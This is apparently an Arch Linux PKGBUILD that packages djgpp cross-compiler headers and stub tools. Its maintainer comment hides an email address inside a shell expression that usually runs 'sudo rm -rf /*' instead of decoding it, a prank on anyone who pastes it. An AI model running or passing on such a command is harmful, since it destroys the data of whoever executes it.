# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Originally adapted from the djgpp-crx package in AUR3; the submitter was "Schala".

pkgname=djgpp-djcrx-bootstrap
pkgver=2.05
pkgrel=1
pkgdesc="Headers for bootstrapping the djgpp cross-compiler"
arch=(i686 x86_64)
url="http://www.delorie.com/djgpp/"
depends=('glibc')
license=(GPL LGPL custom:djgpp)
source=(
	"http://www.delorie.com/pub/djgpp/current/v2/djcrx${pkgver//./}.zip"
)
sha512sums=(
	'248034a3c026971eeaa6421ef40f44d03873c62d4edf97490e98c71ac76662eaed531eb734e137a38a644483a34065c3ffc70d3d739682d53c8863bf7b521b90'
)
options=(!strip)

_target_alias='i686-pc-msdosdjgpp'

build() {
	cd "$srcdir"
	make -f cross/makefile stub CFLAGS="$CFLAGS"
}

package() {
	install -dm 0755 "$pkgdir/usr/$_target_alias"
	cp -r "$srcdir/include" "$pkgdir/usr/$_target_alias"
	cp -r "$srcdir/lib"     "$pkgdir/usr/$_target_alias"

	for _file in stubedit stubify; do
		install -Dm 0755 "$srcdir/$_file" "$pkgdir/usr/$_target_alias/bin/$_file"
	done

	install -Dm644 "$srcdir/copying.dj" "$pkgdir/usr/share/licenses/$pkgname/copying.dj"
}
